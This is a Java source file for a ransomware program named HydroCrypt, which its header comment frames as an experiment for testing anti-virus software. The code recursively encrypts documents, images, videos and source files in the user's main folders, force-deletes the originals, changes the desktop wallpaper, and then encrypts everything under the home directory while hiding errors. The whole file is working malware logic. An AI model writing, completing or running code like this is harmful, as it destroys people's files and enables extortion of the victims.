package net.hydrotekz.HydroCrypt;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;

public class Ransomware {

	/***************************************************************
	 *
	 * Ransomware Virus
	 * 
	 * This is an experiment for testing the strength of anti-viruses.
	 *
	 ********************************/

	public static List<String> targetedFileTypes = new ArrayList<String>();

	public static void main(String[] args) throws Exception {
		// Targeted folders
		File docs = new File(System.getProperty("user.home") + File.separator + "Documents");
		File desktop = new File(System.getProperty("user.home") + File.separator + "Desktop");
		File pictures = new File(System.getProperty("user.home") + File.separator + "Pictures");
		File videos = new File(System.getProperty("user.home") + File.separator + "Videos");
		File[] mainTargets = {docs, desktop, pictures, videos};
		File lastTarget = new File(System.getProperty("user.home"));

		// Targeted file types
		String[] targetArray = {"docx", "doc", "pdf", "png", "mp4", "mkv", "jpg", "php", "html", "txt", "flv", "java", "xlsx", "pptx", "vsdx", "xls", "ppt", "vsd",
				"gsheet", "gslides", "gdoc", "gform"};
		for (String targetType : targetArray) targetedFileTypes.add(targetType);

		// Load modules
		Encryptor.loadModule();
		Decryptor.loadModule();

		// Start encryption
		for (File folder : mainTargets){
			loopEncrypt(folder, false);
		}

		// Change background
		Wallpaper.changeWallpaper();

		// Finish with pain
		loopEncrypt(lastTarget, true);

		//		// Testing
		//		File test = new File("C:/Users/andre/Desktop/Spigot Anti-Cheat.docx");
		//		Encryptor.encryptFile(test);
		//		Decryptor.decryptFile(new File(test.getPath() + ".rsa"), new File(test.getPath() + ".rsa.docx"));
	}

	private static void loopEncrypt(File file, boolean respectFileType) {
		if (file.isFile() && !file.isDirectory()){
			// Encrypt found file
			try {
				String ext = FilenameUtils.getExtension(file.getPath());
				if (!respectFileType || (targetedFileTypes.contains(ext) && !file.getName().equalsIgnoreCase("GetRekt.png"))){
					if (!file.getName().equalsIgnoreCase("desktop.ini")){
						Encryptor.encryptFile(file);
						FileUtils.forceDelete(file);
					}
				}


			} catch (Exception ex){
				// Ignore error
			}

		} else if (file.isDirectory() && !file.getName().equalsIgnoreCase("AppData")){
			// Find more files
			try {
				for (File f : file.listFiles()){
					loopEncrypt(refresh(f), respectFileType);
				}
			} catch (Exception ex){
				// Ignore error
			}
		}
	}

	// Refreshes file
	private static File refresh(File f){
		return new File(f.getAbsolutePath());
	}
}